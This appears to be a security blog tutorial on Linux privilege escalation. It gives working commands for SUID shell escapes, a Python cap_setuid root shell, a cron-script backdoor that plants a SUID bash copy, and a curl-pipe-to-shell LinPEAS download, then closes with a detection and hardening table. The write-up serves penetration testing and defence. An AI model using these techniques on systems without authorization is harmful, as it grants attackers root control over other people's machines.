---
title: "Linux Privilege Escalation: Exploiting Misconfigurations in Production Environments"
description: "Systematic approach to identifying and exploiting common Linux privilege escalation vectors including SUID binaries, capabilities, and cron misconfigurations."
author: "Sivabalan Chandra Sekaran"
pubDate: 2025-06-18
coverImage: "images/covers/linux-privesc.svg"
tags: ["linux", "privilege-escalation", "suid", "capabilities"]
categories: ["Linux", "Purple Team"]
references:
  - title: "GTFOBins"
    url: "https://gtfobins.github.io/"
  - title: "Linux Privilege Escalation — HackTricks"
    url: "https://book.hacktricks.xyz/linux-hardening/privilege-escalation"
---

## Methodology

Effective privilege escalation on Linux follows an enumerate-then-exploit workflow. Automated tools accelerate discovery, but manual validation prevents false positives from noisy output.

## Initial Enumeration

```bash title="enum_script.sh"
#!/bin/bash
# Quick privilege escalation checks
id
sudo -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.* 2>/dev/null
```

Tools like LinPEAS and Linux Exploit Suggester complement manual checks:

```bash title="linpeas.sh"
curl -L linpeas.sh | sh
# Or run from local copy in restricted environments
./linpeas.sh -a
```

## SUID Binary Abuse

World-writable SUID binaries are rare but critical findings:

```bash title="suid_find.sh"
find / -perm -4000 -type f 2>/dev/null | xargs ls -la
```

**Example:** `find` with SUID bit allows shell escape:

```bash title="suid_exploit.sh"
find . -exec /bin/sh -p \; -quit
```

Reference [GTFOBins](https://gtfobins.github.io/) for binary-specific techniques.

## Linux Capabilities

Capabilities provide granular privileges without full root:

```bash title="capabilities.sh"
getcap -r / 2>/dev/null
# Example output:
# /usr/bin/python3.8 = cap_setuid+ep
```

Python with `cap_setuid` enables immediate root:

```python title="cap_setuid.py"
import os
os.setuid(0)
os.system("/bin/bash")
```

## Cron Job Misconfigurations

Writable cron scripts running as root:

```bash title="cron_check.sh"
# Find world-writable cron entries
find /etc/cron* -type f -perm -o+w 2>/dev/null
ls -la /var/spool/cron/crontabs/
```

If `/opt/backup/backup.sh` is writable and runs as root via cron:

```bash title="cron_exploit.sh"
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/backup/backup.sh
# Wait for cron execution, then:
/tmp/rootbash -p
```

## Kernel Exploits

Always verify kernel version before attempting exploits:

```bash title="kernel_check.sh"
uname -a
cat /proc/version
searchsploit linux kernel $(uname -r)
```

> **Note:** Kernel exploits should be last resort — they risk system instability and are easily detected.

## Detection & Hardening

| Vector | Detection | Mitigation |
|--------|-----------|------------|
| SUID | Auditd on SUID execution | Remove unnecessary SUID bits |
| Capabilities | Monitor `setuid` syscalls | Drop capabilities with `setcap -r` |
| Cron | File integrity monitoring | Restrict write permissions |
| Writable `/etc/passwd` | FIM alerts | Proper file permissions |

[^1]: The Dirty Pipe vulnerability (CVE-2022-0847) demonstrated that kernel bugs remain viable on unpatched systems.

[^1]: Always obtain authorization before performing privilege escalation testing.
